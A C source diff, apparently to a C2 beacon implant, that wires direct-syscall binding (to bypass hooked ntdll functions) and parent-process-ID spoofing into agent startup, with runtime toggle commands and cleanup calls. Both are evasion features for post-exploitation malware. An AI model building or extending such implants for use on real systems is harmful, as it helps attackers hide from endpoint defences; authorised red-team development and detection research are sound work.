@@ -1,4 +1,5 @@
 #include "beacon_agent_internal.h"
+#include "beacon_spawn.h"
 
 #ifdef BEACON_TEST
 #include "beacon_test_hooks.h"
@@ -66,6 +67,18 @@ INT AgentInit(Agent* agent)
         return 0;
     }
 
+    /* syscall 层依赖 Win32ApiInit 解析出的 ntdll 地址，必须在它之后初始化。
+     * 是否绑定（启用 syscall）由 profile.syscall_enabled 决定，运行中可用
+     * `syscall on|off` 命令切换（SyscallSetEnabled，恢复 original 地址）。 */
+    SyscallInit(&agent->ctx.syscall);
+    if (agent->ctx.profile.syscall_enabled) {
+        SyscallBindApiTable(&agent->ctx.syscall, &agent->ctx.api);
+    }
+
+    /* 应用 profile 的 PPID 欺骗目标（进程名或 PID；空 = 不欺骗），
+     * 运行中可用 spawn_ppid 命令覆盖。 */
+    SpawnApplyProfile(&agent->ctx.api, agent->ctx.profile.spawn_ppid);
+
 #ifdef BEACON_TEST
     InterlockedIncrement(&g_agent_wsa_startup_calls);
     BeaconTestRecord(BEACON_TEST_EVENT_WSA_STARTUP, 0, 0);
@@ -73,6 +86,7 @@ INT AgentInit(Agent* agent)
 #else
     if (WSAStartup(MAKEWORD(2, 2), &agent->wsa) != 0) {
 #endif
+        SyscallCleanup(&agent->ctx.syscall);
         ContextFree(&agent->ctx);
         return 0;
     }
@@ -91,6 +105,7 @@ VOID AgentFree(Agent* agent)
     }
 
     if (agent->initialized) {
+        SyscallCleanup(&agent->ctx.syscall);
         ContextFree(&agent->ctx);
         agent->initialized = 0;
     }
